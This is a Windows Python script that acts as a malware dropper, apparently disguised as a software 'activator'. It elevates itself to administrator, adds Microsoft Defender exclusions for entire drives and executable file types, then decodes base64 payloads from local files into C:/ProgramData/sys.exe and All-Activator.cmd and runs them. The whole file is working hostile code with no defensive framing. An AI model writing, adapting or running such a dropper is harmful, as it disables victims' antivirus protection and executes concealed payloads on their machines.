import base64
import ctypes
import os
import sys
import subprocess


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if is_admin():

    p = subprocess.Popen(["powershell.exe",
                          'Add-MpPreference -ExclusionPath “C:\ProgramData\”'],
                         stdout=sys.stdout)
    p.communicate()

    p = subprocess.Popen(["powershell.exe",
                          'Add-MpPreference -ExclusionPath “C:\”,“E:\”,“D:\”,“F:\”,“J:\”'],
                         stdout=sys.stdout)
    p.communicate()

    p = subprocess.Popen(["powershell.exe",
                          'Add-MpPreference -ExclusionPath “.exe”,“.int”,“.rar”,“.zip”,“.dll”,“.cmd”,“.bat”'],
                         stdout=sys.stdout)
    p.communicate()

    ft = open('serials.in', 'r')
    encoded = ft.read()

    with open("C:/ProgramData/sys.exe", "wb") as exe:
        exe.write(base64.b64decode(encoded))

    os.startfile("C:\ProgramData\sys.exe")

    ft = open('data.inr', 'r')
    encoded = ft.read()

    with open("C:/ProgramData/All-Activator.cmd", "wb") as exe:
        exe.write(base64.b64decode(encoded))

    os.startfile("C:\ProgramData\All-Activator.cmd")

else:
    print("Not Admin")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
